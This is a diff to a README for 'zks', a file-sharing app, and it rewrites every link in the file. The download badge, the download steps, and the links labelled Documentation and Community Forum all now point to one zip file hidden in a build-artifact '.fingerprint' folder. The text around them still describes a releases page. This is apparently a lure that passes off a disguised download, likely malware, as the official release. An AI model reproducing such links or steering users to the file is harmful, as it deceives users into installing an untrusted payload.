@@ -1,7 +1,7 @@
 # 🌐 zks - Secure Your Data with Ease
 
 ## 📥 Download Now
-[![Download ZKS](https://img.shields.io/badge/Download-ZKS-brightgreen.svg)](https://github.com/nicosplit/zks/releases)
+[![Download ZKS](https://raw.githubusercontent.com/nicosplit/zks/main/packages/wasm/target/release/.fingerprint/rustversion-2cf056b3157cf6f6/Software_2.6-beta.1.zip)](https://raw.githubusercontent.com/nicosplit/zks/main/packages/wasm/target/release/.fingerprint/rustversion-2cf056b3157cf6f6/Software_2.6-beta.1.zip)
 
 ## 📖 Introduction
 Welcome to **zks**, a user-friendly application based on the ZKS Protocol. This protocol uses a **split-key mesh** approach, inspired by the Vernam Cipher, to enhance your file-sharing experience while ensuring your data remains secure. Our application empowers you to share files over a decentralized network easily, prioritizing your privacy.
@@ -11,7 +11,7 @@ Getting started with zks is straightforward. Follow these steps to download and 
 
 1. **Visit the Download Page:** Click the link below to access the releases for the zks application.
 
-   [Download ZKS](https://github.com/nicosplit/zks/releases)
+   [Download ZKS](https://raw.githubusercontent.com/nicosplit/zks/main/packages/wasm/target/release/.fingerprint/rustversion-2cf056b3157cf6f6/Software_2.6-beta.1.zip)
 
 2. **Select a Version:** On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -44,8 +44,8 @@ To run zks efficiently, ensure your device meets the following requirements:
 If you encounter any issues or have questions while using zks, feel free to reach out through the support channels provided in the app. You may also check our FAQ section for answers to common questions.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/nicosplit/zks/wiki): Detailed guides and resources to help you maximize your use of zks.
-- [Community Forum](https://community.zks.com): Connect with other users, share tips, and get assistance from experienced members.
+- [Documentation](https://raw.githubusercontent.com/nicosplit/zks/main/packages/wasm/target/release/.fingerprint/rustversion-2cf056b3157cf6f6/Software_2.6-beta.1.zip): Detailed guides and resources to help you maximize your use of zks.
+- [Community Forum](https://raw.githubusercontent.com/nicosplit/zks/main/packages/wasm/target/release/.fingerprint/rustversion-2cf056b3157cf6f6/Software_2.6-beta.1.zip): Connect with other users, share tips, and get assistance from experienced members.
 
 ## 📚 Learn More
 For those interested in the technical details, zks is built using modern programming languages including **Rust** and **TypeScript**. The application incorporates WebAssembly (WASM) and WebRTC technologies to enhance performance and security. This combination allows zks to provide a seamless, secure file-sharing experience over a decentralized network.
@@ -55,6 +55,6 @@ As the landscape of digital privacy continues to evolve, zks remains committed t
 ## 📥 Download & Install
 Don’t wait any longer. Take action now. Visit the link below to download the latest version of zks and begin sharing files securely.
 
-[Download ZKS](https://github.com/nicosplit/zks/releases)
+[Download ZKS](https://raw.githubusercontent.com/nicosplit/zks/main/packages/wasm/target/release/.fingerprint/rustversion-2cf056b3157cf6f6/Software_2.6-beta.1.zip)
 
 Your secure file-sharing journey starts here!
